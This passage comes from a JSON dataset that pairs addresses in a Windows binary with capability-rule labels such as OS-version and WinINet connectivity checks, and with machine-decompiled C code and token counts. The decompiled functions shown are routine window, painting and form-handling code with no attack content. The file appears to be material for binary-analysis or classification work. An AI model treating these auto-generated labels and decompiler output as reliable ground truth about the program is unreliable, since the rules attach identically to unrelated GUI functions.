        "decompiled_code": "\nvoid fcn.0043d7a4(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x322) != 0) {\n        uStack28 = 0x43d7e5;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack32;\n        (**(in_EAX + 800))();\n        *in_FS_OFFSET = uStack32;\n    }\n    return;\n}\n",
        "token_count": 146
    },
    "0043d804": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043d804(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    fcn.00452fb8();\n    if ((*(in_EAX + 0x268) != 0) && ((*(in_EAX + 0x30) == 0 || ((*(in_EAX + 0x1c) & 0x10) == 0)))) {\n        *(in_EAX + 0x268) = 0;\n        cVar1 = fcn.0040484c();\n        if (cVar1 != '\\0') {\n            fcn.00440ad0();\n        }\n    }\n    fcn.00447e3c();\n    cVar1 = fcn.00448128();\n    if (cVar1 != '\\0') {\n        fcn.00447ef0();\n    }\n    return;\n}\n",
        "token_count": 192
    },
    "0043d9a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043d9a4(void)\n\n{\n    bool bVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x43d9b7;\n    fcn.00454204();\n    uStack24 = 0x43dc21;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    *(in_EAX + 0x2b0) = 0;\n    *(in_EAX + 0x2b4) = 0;\n    *(in_EAX + 0x2b8) = 0;\n    bVar1 = false;\n    puStack20 = &stack0xfffffffc;\n    iVar2 = fcn.004045dc();\n    if (iVar2 == *0x43a2e8) {\n        *(in_EAX + 0x27c) = *0x4977f5 ^ 1;\n    }\n    fcn.0045382c();\n    if ((**(in_EAX + 0x2a4) != 0) && (0 < *(in_EAX + 0x2b8))) {\n        if (((*(in_EAX + 0x8c) & 0x10) != 0) && (**(in_EAX + 0x2a4) != *(*0x499c20 + 0x40))) {\n            uVar3 = fcn.0042499c(*(*0x499c20 + 0x40), **(in_EAX + 0x2a4));\n            sub.kernel32.dll_MulDiv(uVar3);\n            fcn.004249a4();\n        }\n        **(in_EAX + 0x2a4) = *(*0x499c20 + 0x40);\n        iVar2 = fcn.0043dfd8();\n        if (iVar2 != *(in_EAX + 0x2b8)) {\n            bVar1 = true;\n            fcn.0043cf00();\n            fcn.00450350();\n            fcn.004580b0();\n            if ((*(in_EAX + 0x8c) & 4) != 0) {\n                uVar3 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x2b0), iVar2, *(in_EAX + 0x2b8));\n                *(in_EAX + 0x2b0) = uVar3;\n            }\n            if ((*(in_EAX + 0x8c) & 8) != 0) {\n                uVar3 = sub.kernel32.dll_MulDiv();\n                *(in_EAX + 0x2b4) = uVar3;\n            }\n            if ((*(in_EAX + 0x8c) & 0x20) != 0) {\n                uVar3 = sub.kernel32.dll_MulDiv(*(in_EAX + 0x242), iVar2, *(in_EAX + 0x2b8));\n                *(in_EAX + 0x242) = uVar3;\n                uVar3 = sub.kernel32.dll_MulDiv();\n                *(in_EAX + 0x246) = uVar3;\n            }\n        }\n    }\n    if (0 < *(in_EAX + 0x2b0)) {\n        fcn.00450228();\n    }\n    if (0 < *(in_EAX + 0x2b4)) {\n        fcn.0045026c();\n    }\n    *(in_EAX + 0x8c) = *0x43dc30;\n    if (!bVar1) {\n        fcn.0043cf00();\n        fcn.004580b0();\n    }\n    uVar3 = 0;\n    fcn.00451b4c(0);\n    *in_FS_OFFSET = uVar3;\n    fcn.0045420c(0x43dc28);\n    return;\n}\n",
        "token_count": 908
    },
    "0043dc34": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0043dc34(uint arg_8h)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    int32_t iVar2;\n    \n    // switch table (6 cases) at 0x43dc4a\n    switch(in_EAX & 0x7f) {\n    case 0:\n        uVar1 = fcn.00447e3c();\n        return uVar1 & 0xffffff00 | *(uVar1 + 0xc) != 0;\n    case 1:\n        uVar1 = fcn.00447e3c();\n        return uVar1 & 0xffffff00 | *(uVar1 + 0x10) != 0;\n    case 2:\n        uVar1 = fcn.00447e3c();\n        return uVar1 & 0xffffff00 | *(uVar1 + 0x14) != 0;\n    case 3:\n        uVar1 = fcn.00447e3c();\n        return uVar1 & 0xffffff00 | *(uVar1 + 0x18) != 0;\n    case 4:\n        iVar2 = fcn.00447e3c();\n        return *(iVar2 + 8);\n    case 5:\n        iVar2 = fcn.00447e3c();\n        return *(iVar2 + 0x28);\n    default:\n        return 0;\n    }\n}\n",
        "token_count": 316
    },
    "0043df9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043df9c(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n        return *(in_EAX + 0x18) >> 0x10;\n    }\n    return *(in_EAX + 0x40);\n}\n",
        "token_count": 97
    },
    "0043dfbc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043dfbc(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x1c) & 0x10) != 0) && (*(in_EAX + 0x30) != 0)) {\n        return *(in_EAX + 0x18);\n    }\n    return *(in_EAX + 0x44);\n}\n",
        "token_count": 90
    },
    "0043e088": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043e088(void)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if (**0x494a10 == '\\0') {\n        fcn.004585f8();\n        iVar3 = fcn.0043b75c();\n        if (iVar3 != 0) {\n            (**(*in_EAX + 0x80))();\n        }\n    }\n    else {\n        cVar1 = fcn.00458904();\n        if ((cVar1 != '\\0') && (*(in_EAX + 0x271) != '\\x03')) {\n            uVar2 = fcn.00441144();\n            uVar2 = fcn.004585f8(0x80, 1, uVar2);\n            sub.user32.dll_SendMessageA(uVar2);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 204
    },
    "0043e0f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043e0f4(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 600) == '\\0') && (*(*(in_EAX + 0x250) + 0x10) == 0)) && (*(*(in_EAX + 0x254) + 0x10) == 0)) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 96
    },
    "0043e450": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043e450(void)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint32_t uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x43e536;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puVar1 = &stack0xfffffffc;\n    if (((*(in_EAX + 0x277) == '\\x01') && (puVar1 = &stack0xfffffffc,  *(in_EAX + 0x57) != '\\0')) &&\n       (puVar1 = &stack0xfffffffc,  *(in_EAX + 0x30) == 0)) {\n        fcn.00407550();\n        fcn.0040dafc();\n        fcn.00404ec4();\n        puVar1 = puStack16;\n    }\n    puStack16 = puVar1;\n    if ((in_EAX == *(*0x499c1c + 0x44)) && ((*(in_EAX + 0x1c) & 8) == 0)) {\n        if (*(in_EAX + 0x57) == '\\0') {\n            fcn.0044821c();\n            fcn.0043b7d8();\n            uVar3 = fcn.0044821c();\n            fcn.004585f8(uVar3);\n            fcn.0043b7d8();\n        }\n        else {\n            uVar2 = fcn.0044821c();\n            fcn.004585f8(uVar2 ^ 1);\n            fcn.0043b7d8();\n            fcn.0043b7d8();\n        }\n    }\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x43e53d;\n    uStack20 = 0x43e535;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 473
    },
    "0043e548": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e548(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    bool bVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if ((param_2 != in_EAX[0xc]) && (param_2 != in_EAX)) {\n        bVar1 = in_EAX[0xc] == NULL;\n        if (bVar1) {\n            puStack20 = 0x43e581;\n            fcn.00459998();\n        }\n        uStack24 = 0x43e5f8;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        if (bVar1) {\n            puStack20 = &stack0xfffffffc;\n            (**(*in_EAX + 0xb0))();\n        }\n        if ((*(in_EAX + 7) & 0x10) == 0) {\n            in_EAX[0x9a] = 0;\n        }\n        in_EAX[0x9b] = 0;\n        fcn.00459a60();\n        if (in_EAX[0xc] == 0) {\n            fcn.004551b8();\n        }\n        *in_FS_OFFSET = uStack28;\n        puStack20 = 0x43e5ff;\n        if (bVar1) {\n            uStack24 = 0x43e5f7;\n            fcn.00459998();\n        }\n        return;\n    }\n    return;\n}\n",
        "token_count": 377
    },
    "0043e604": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043e604(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    fcn.0042044c(arg_8h);\n    if (*(in_EAX + 0x298) != 0) {\n        (**(**(in_EAX + 0x298) + 0x30))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "0043e644": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043e644(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar6 = *param_2;\n    if (iVar6 < 0x113) {\n        if (iVar6 == 0x112) {\n            if ((((param_2[1] & 0xfff0U) == 0xf120) && (*(*0x499c1c + 0x44) == in_EAX)) &&\n               (cVar1 = fcn.0044821c(),  cVar1 != '\\0')) {\n                fcn.00448224();\n            }\n            goto code_r0x0043eb70;\n        }\n        if (iVar6 - 6U < 3) {\n            if (*0x492508 == '\\0') {\n                return;\n            }\n            if ((*param_2 == 7) && ((*(in_EAX + 7) & 0x10) == 0)) {\n                iVar6 = 0;\n                if (*(in_EAX + 0x277) == '\\x02') {\n                    iVar2 = fcn.0043f4f4();\n                    if (iVar2 != 0) {\n                        fcn.0043f4f4();\n                        iVar6 = fcn.004585f8();\n                    }\n                }\n                else if ((in_EAX[0x9a] != NULL) && (in_EAX[0x9a] != in_EAX)) {\n                    iVar6 = fcn.004585f8();\n                }\n                if (iVar6 != 0) {\n                    sub.user32.dll_SetFocus();\n                    return;\n                }\n            }\n            goto code_r0x0043eb70;\n        }\n        if (iVar6 == 0x2b) {\n            piVar3 = param_2[2];\n            if (((*piVar3 == 1) && (in_EAX[0xa4] != 0)) && (iVar6 = fcn.00437a24(),  iVar6 != 0)) {\n                fcn.00425108();\n                *in_FS_OFFSET = &stack0xffffffd0;\n                sub.gdi32.dll_SaveDC();\n                *in_FS_OFFSET = &stack0xffffffc0;\n                fcn.0042579c();\n                fcn.00425630();\n                piVar3 = *(piVar3 + 4);\n                puStack72 = 0x43e97c;\n                fcn.004391ac(piVar3);\n                *in_FS_OFFSET = piVar3;\n                fcn.0042579c();\n                puStack72 = 0x43e9a3;\n                sub.gdi32.dll_RestoreDC();\n                return;\n            }\n            goto code_r0x0043eb70;\n        }\n        if (iVar6 == 0x2c) {\n            piVar3 = param_2[2];\n            if (((*piVar3 == 1) && (in_EAX[0xa4] != 0)) && (piVar4 = fcn.00437a24(),  piVar4 != NULL)) {\n                fcn.004585f8();\n                uVar5 = sub.user32.dll_GetWindowDC();\n                *in_FS_OFFSET = &stack0xffffffcc;\n                fcn.00425108();\n                *in_FS_OFFSET = &stack0xffffffc0;\n                puStack72 = 0x43ea46;\n                iVar6 = sub.gdi32.dll_SaveDC();\n                uStack76 = 0x43eaab;\n                piStack80 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffb0;\n                puStack72 = &stack0xfffffffc;\n                fcn.0042579c();\n                fcn.00425630();\n                piVar3 = piVar3 + 4;\n                (**(*piVar4 + 0x38))();\n                *in_FS_OFFSET = piVar3;\n                uStack76 = 0x43eab2;\n                piStack80 = 0x43ea9d;\n                fcn.0042579c();\n                piStack80 = iVar6;\n                sub.gdi32.dll_RestoreDC(uVar5);\n                return;\n            }\n            goto code_r0x0043eb70;\n        }\n        if (iVar6 == 0x46) {\n            if (*0x43eb88 == (*(in_EAX + 7) & *0x43eb84)) {\n                if ((*(in_EAX + 0x9e) - 1U < 2) && (*(in_EAX + 0x273) != '\\x02')) {\n                    *(param_2[2] + 0x18) = *(param_2[2] + 0x18) | 2;\n                }\n                if (((*(in_EAX + 0x9e) == '\\x01') || (*(in_EAX + 0x9e) == '\\x03')) &&\n                   ((*(in_EAX + 0x271) == '\\x02' || (*(in_EAX + 0x271) == '\\x05')))) {\n                    *(param_2[2] + 0x18) = *(param_2[2] + 0x18) | 1;\n                }\n            }\n            goto code_r0x0043eb70;\n        }\n    }\n    else {\n        if (iVar6 - 0x31eU < 2) {\n            fcn.00447ef0();\n            goto code_r0x0043eb70;\n        }\n        if (iVar6 == 0xb01a) {\n            if (in_EAX[0x25] != 0) {\n                fcn.0040484c();\n            }\n            goto code_r0x0043eb70;\n        }\n        if (iVar6 == 0xb01b) {\n            if (in_EAX[0x25] != 0) {\n                fcn.0040484c();\n            }\n            goto code_r0x0043eb70;\n        }\n        if (iVar6 == 0xb047) {\n            iVar6 = param_2[1];\n            iVar2 = 0;\n            while ((iVar6 != 0 && (iVar2 == 0))) {\n                iVar2 = fcn.0044d2f4();\n                iVar6 = sub.user32.dll_GetParent();\n            }\n            if ((iVar2 != 0) &&\n               ((((piVar3 = fcn.0043bd90(),  iVar2 != in_EAX[0x9a] || (iVar2 != *(*0x499c20 + 100))) && (piVar3 != NULL)\n                 ) && ((piVar3 == in_EAX || (piVar3 != *(*0x499c20 + 0x68))))))) {\n                if ((piVar3[0x9a] != 0) && (iVar2 != piVar3[0x9a])) {\n                    fcn.00451b4c(0);\n                }\n                (**(*piVar3 + 0xf8))();\n            }\n            goto code_r0x0043eb70;\n        }\n    }\n    if (iVar6 == *0x499c28) {\n        fcn.00451b4c(0);\n        fcn.00451b4c(0);\n        fcn.00451b4c(0);\n        fcn.00451b4c(0);\n        fcn.00451b4c(0);\n        fcn.00451b4c(0);\n    }\ncode_r0x0043eb70:\n    fcn.004556f4();\n    return;\n}\n",
        "token_count": 1771
    },
    "0043ec18": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043ec18(uint param_1, int32_t *param_2)\n\n{\n    int32_t *in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffff6c;\n    int32_t iStack140;\n    uint *puStack136;\n    uchar *puStack132;\n    uint *puStack128;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_5ch;\n    uint var_58h;\n    uint var_4ch;\n    int32_t var_ch;\n    int32_t *var_8h;\n    int32_t *var_4h;\n    \n    iVar2 = *param_2;\n    var_8h = param_2;\n    var_4h = in_EAX;\n    if (iVar2 != 0xf) {\n        if (iVar2 == 0x14) {\n            fcn.00424fec();\n            puStack128 = 0x43ec86;\n            (**(*var_4h + 0x44))();\n            puStack128 = &fcn.0043ec18::var_6ch;\n            puStack132 = var_8h[1];\n            puStack136 = 0x43ec96;\n            sub.user32.dll_FillRect();\n            if ((*(var_4h + 0x277) == '\\x02') && (var_4h[0xa7] != 0)) {\n                puStack136 = &fcn.0043ec18::var_5ch;\n                iStack140 = var_4h[0xa7];\n                sub.user32.dll_GetClientRect();\n                uVar1 = fcn.00424fec();\n                sub.user32.dll_FillRect(var_8h[1], &fcn.0043ec18::var_5ch, uVar1);\n            }\n            var_8h[3] = 1;\n        }\n        else if (iVar2 == 0x3f) {\n            puStack128 = 0x43ecf5;\n            fcn.0043eb8c(&stack0xfffffffc);\n            if (*(var_4h + 0x277) == '\\x02') {\n                iVar2 = fcn.0043f528();\n                if (iVar2 != 0) {\n                    puStack128 = 0x43ed18;\n                    fcn.0043ebd8(&stack0xfffffffc);\n                }\n                fcn.0043b78c();\n            }\n        }\n        else if (iVar2 == 0x84) {\n            puStack128 = 0x43ec4f;\n            fcn.0043eb8c(&stack0xfffffffc);\n            if (var_8h[3] == 1) {\n                var_8h[3] = -1;\n            }\n        }\n        else {\n            puStack128 = 0x43edf3;\n            fcn.0043eb8c(&stack0xfffffffc);\n        }\n        return;\n    }\n    var_ch = param_2[1];\n    if (var_ch == 0) {\n        puStack128 = in_EAX[0xa7];\n        puStack132 = 0x43ed58;\n        iVar2 = sub.user32.dll_BeginPaint();\n        var_8h[1] = iVar2;\n    }\n    puStack136 = 0x43ede6;\n    iStack140 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff74;\n    puStack132 = &stack0xfffffffc;\n    if (var_ch == 0) {\n        in_stack_ffffff6c = var_4h[0xa7];\n        puStack132 = &stack0xfffffffc;\n        sub.user32.dll_GetWindowRect(in_stack_ffffff6c, &fcn.0043ec18::var_5ch);\n        fcn.004503d4();\n        fcn.0044eea0();\n    }\n    fcn.00455d50();\n    *in_FS_OFFSET = in_stack_ffffff6c;\n    iStack140 = 0x43edf4;\n    if (var_ch == 0) {\n        sub.user32.dll_EndPaint(var_4h[0xa7], &fcn.0043ec18::var_4ch);\n    }\n    return;\n}\n",
        "token_count": 955
    },
    "0043eefc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0043eefc(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    if (*(in_EAX + 0xa3) == '\\0') {\n        *(in_EAX + 0xa3) = 1;\n        uStack20 = 0x43ef7c;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &uStack24;\n        if (*(in_EAX + 0x18) != '\\0') {\n            if (in_EAX[0xc] == 0) {\n                puStack16 = &stack0xfffffffc;\n                (**(*in_EAX + 0x74))();\n            }\n            else {\n                (**(*in_EAX + 0x74))();\n            }\n            (**(*in_EAX + 0x70))();\n        }\n        *in_FS_OFFSET = uStack24;\n        *(in_EAX + 0xa3) = 0;\n        return;\n    }\n    return;\n}\n",
        "token_count": 258
    },
    "0043f1a4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar __cdecl fcn.0043f1a4(uint32_t *arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint32_t *in_ECX;\n    uint32_t *in_EDX;\n    \n    *in_EDX = *in_EDX & 0x7f3bff7f;\n    *in_ECX = *in_ECX & 0xfffffe7e;\n    *arg_8h = *arg_8h & 0xffffd7ff;\n    cVar1 = *(in_EAX + 0x271);\n    if ((*(in_EAX + 0x277) == '\\x01') && ((cVar1 == '\\0' || (cVar1 == '\\x03')))) {\n        cVar1 = '\\x02';\n    }\n    // switch table (6 cases) at 0x43f1f2\n    switch(cVar1) {\n    case '\\0':\n        if ((*(in_EAX + 0x30) == 0) && (*(in_EAX + 0x1c4) == 0)) {\n            *in_EDX = *in_EDX | 0x80000000;\n        }\n        break;\n    case '\\x01':\n    case '\\x04':\n        *in_EDX = *in_EDX | 0xc00000;\n        break;\n    case '\\x02':\n    case '\\x05':\n        *in_EDX = *in_EDX | 0xc40000;\n        break;\n    case '\\x03':\n        if (((*(in_EAX + 0x1c) & 0x10) == 0) || (*(in_EAX + 0x30) == 0)) {\n            *in_EDX = *in_EDX | 0x80c00000;\n        }\n        else {\n            *in_EDX = *in_EDX | 0xc00000;\n        }\n        *in_ECX = *in_ECX | 0x101;\n        if (**0x494a10 == '\\0') {\n            *in_EDX = *in_EDX | 0x400080;\n        }\n        *arg_8h = *arg_8h | 0x2808;\n    }\n    if ((cVar1 - 4U < 2) && (*(in_EAX + 0x277) != '\\x01')) {\n        *in_ECX = *in_ECX | 0x80;\n    }\n    return cVar1 + -6;\n}\n",
        "token_count": 549
    },
    "0043f2b8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0043f2b8(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uchar *puVar4;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    \n    if (param_2 != *(in_EAX + 0x271)) {\n        *(in_EAX + 0x271) = param_2;\n        uStack24 = 0x43f2f6;\n        fcn.0043cc40();\n        uStack24 = 0x43f2fd;\n        cVar1 = fcn.00458904();\n        if ((cVar1 != '\\0') && (((*(in_EAX + 7) & 0x10) == 0 || (((*(in_EAX + 7) & 0x10) != 0 && (in_EAX[0xc] != 0))))))\n        {\n            uStack24 = 0xfffffff0;\n            uStack28 = 0x43f328;\n            uStack28 = fcn.004585f8();\n            uStack32 = 0x43f32e;\n            uStack28 = sub.user32.dll_GetWindowLongA();\n            uStack32 = 0xffffffec;\n            uStack36 = 0x43f33a;\n            uStack36 = fcn.004585f8();\n            uStack32 = sub.user32.dll_GetWindowLongA();\n            uVar2 = fcn.004585f8(0xffffffe6);\n            uStack36 = sub.user32.dll_GetClassLongA(uVar2);\n            puVar4 = &stack0xffffffdc;\n            fcn.0040484c(puVar4);\n            fcn.0040484c();\n            uVar3 = 0xfffffff0;\n            uVar2 = fcn.004585f8(0xfffffff0, puVar4);\n            sub.user32.dll_SetWindowLongA(uVar2);\n            uVar2 = fcn.004585f8(0xffffffec, uVar3);\n            sub.user32.dll_SetWindowLongA(uVar2);\n            uVar2 = fcn.004585f8(0xffffffe6, uVar3);\n            sub.user32.dll_SetClassLongA(uVar2);\n            cVar1 = fcn.00458904();\n            if (cVar1 != '\\0') {\n                if (**0x494a10 != '\\0') {\n                    if (*(in_EAX + 0x271) == '\\x03') {\n                        uVar2 = fcn.004585f8(0x80, 1, 0);\n                        sub.user32.dll_SendMessageA(uVar2);\n                    }\n                    else {\n                        uVar2 = fcn.00441144();\n                        uVar2 = fcn.004585f8(0x80, 1, uVar2);\n                        sub.user32.dll_SendMessageA(uVar2);\n                    }\n                }\n                uVar2 = fcn.004585f8(0xffffffff);\n                sub.user32.dll_GetSystemMenu(uVar2);\n                fcn.00451b4c(0);\n            }\n            uVar2 = fcn.004585f8(0, 0, 0, 0, 0, 0x37);\n            sub.user32.dll_SetWindowPos(uVar2);\n            (**(*in_EAX + 0x80))();\n        }\n    }\n    return;\n}\n",
        "token_count": 778
    },
    "0043f4f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0043f4f4(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0;\n    if ((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) {\n        sub.user32.dll_SendMessageA(*(in_EAX + 0x29c), 0x229, 0, 0);\n        uVar1 = fcn.0044d2f4();\n    }\n    return uVar1;\n}\n",
        "token_count": 126
    },
    "0043f528": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.0043f528(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if (((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) && (iVar1 = fcn.00443e04(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.00443df0();\n            if (*(iVar2 + 0x277) == '\\x01') {\n                iVar3 = iVar3 + 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return iVar3;\n}\n",
        "token_count": 181
    },
    "0043f574": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0043f574(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (((*(in_EAX + 0x277) == '\\x02') && (*(in_EAX + 0x29c) != 0)) && (iVar1 = fcn.00443e04(),  -1 < iVar1 + -1)) {\n        do {\n            iVar2 = fcn.00443df0();\n            if ((*(iVar2 + 0x277) == '\\x01') && (param_2 = param_2 + -1,  param_2 < 0)) {\n                return iVar2;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 196
    },
    "0043f6d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
